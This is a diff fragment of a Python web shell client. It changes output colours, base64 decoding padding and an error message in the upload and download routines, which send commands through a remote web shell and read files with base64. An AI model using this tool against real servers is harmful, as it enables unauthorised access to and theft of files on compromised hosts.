@@ -138,9 +138,9 @@ try:
                   remotefiletmp = remotefile.rstrip() + ".tmp"
                   if not localslash in localfile:
                      cwd = os.getcwd()
-                     print (colored("[+] Uploading file " + cwd + localslash + localfile + " on " + remotefile + "..\n", "red"))
+                     print (colored("[+] Uploading file " + cwd + localslash + localfile + " on " + remotefile + "..\n", "green"))
                   else:
-                     print (colored("[+] Uploading file " + localfile + " on " + remotefile + "..\n", "red"))
+                     print (colored("[+] Uploading file " + localfile + " on " + remotefile + "..\n", "green"))
                   try:
                      f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
                   except OSError:
@@ -170,9 +170,9 @@ try:
                         if localfile == ".":
                            localfile = command.split()[1]
                            localfile = localfile.split(slash)[-1]
-                        print (colored("[+] Downloading file " + remotefile + " on " + cwd + localslash + localfile + "..\n", "red"))
+                        print (colored("[+] Downloading file " + remotefile + " on " + cwd + localslash + localfile + "..\n", "green"))
                      else:
-                        print (colored("[+] Downloading file " + remotefile + " on " + localfile + "..\n", "red"))
+                        print (colored("[+] Downloading file " + remotefile + " on " + localfile + "..\n", "green"))
                      if system == "linux":
                         base64data = send_command(PIPE + "base64" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
                      if system == "windows":
@@ -181,7 +181,7 @@ try:
                      if "<pre>" in base64data:
                         base64data = str(base64data).split("<pre>", 1)[1] ; base64data = str(base64data).split("</pre>", 1)[0]
                         base64data = remove_html(base64data)
-                     download = base64.b64decode(base64data.encode("utf8"))
+                     download = base64.b64decode(base64data.encode("utf8") + b"========")
                      try:
                         f = open(localfile, "wb") ; f.write(download) ; f.close()
                      except OSError:
@@ -256,4 +256,4 @@ try:
          break
 
 except Exception as e:
-   print(e)
+   print (colored("\n[!] Error getting connection!\n", "red"))
